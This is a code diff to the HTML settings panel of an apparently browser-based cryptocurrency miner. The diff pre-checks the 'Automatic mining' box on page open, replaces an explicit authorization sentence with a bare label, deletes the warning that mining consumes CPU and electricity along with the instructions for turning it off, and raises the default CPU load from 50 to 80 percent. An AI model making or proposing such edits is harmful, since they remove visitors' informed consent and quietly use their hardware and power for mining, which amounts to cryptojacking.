@@ -669,10 +669,9 @@
   </div>
 
   <section class="mining-preferences" aria-label="Automatic mining preferences" data-i18n-aria-label="Automatic mining preferences">
-    <label for="uiAutostart"><input id="uiAutostart" type="checkbox" aria-describedby="uiAutostartHelp uiAutostartStatus">
-      <span data-i18n="I authorize automatic mining on this device when I open this page.">I authorize automatic mining on this device when I open this page.</span>
+    <label for="uiAutostart"><input id="uiAutostart" type="checkbox" checked aria-describedby="uiAutostartStatus">
+      <span data-i18n="Automatic mining">Automatic mining</span>
     </label>
-    <p id="uiAutostartHelp" data-i18n="Mining uses CPU and electricity. This permission is saved only in this browser for this site, including production. Uncheck to disable future automatic starts; use Stop to end the current session.">Mining uses CPU and electricity. This permission is saved only in this browser for this site, including production. Uncheck to disable future automatic starts; use Stop to end the current session.</p>
     <p id="uiAutostartStatus" role="status" aria-live="polite"></p>
   </section>
 
@@ -688,7 +687,7 @@
         <label><span data-i18n="Pool">Pool</span><input name="pool" required autocomplete="off" spellcheck="false"></label>
         <label><span data-i18n="TCP port">TCP port</span><input name="port" type="number" min="1" max="65535" required value="3333"></label>
         <label class="wide"><span data-i18n="WebSocket proxy">WebSocket proxy</span><input name="proxy" required placeholder="wss://your-bridge.example" spellcheck="false"></label>
-        <label>CPU %<input name="workload" type="number" min="0" max="80" step="any" value="50" required></label>
+        <label>CPU %<input name="workload" type="number" min="0" max="80" step="any" value="80" required></label>
         <label><span data-i18n="Interface">Interface</span><select name="display"><option value="widget" data-i18n="Widget">Widget</option><option value="headless" data-i18n="Headless API">Headless API</option></select></label>
         <label class="wide"><span data-i18n="Quickstart">Quickstart</span><span><input name="quickstart" type="checkbox"> <span data-i18n="Request consent on first interaction">Request consent on first interaction</span></span></label>
       </div>
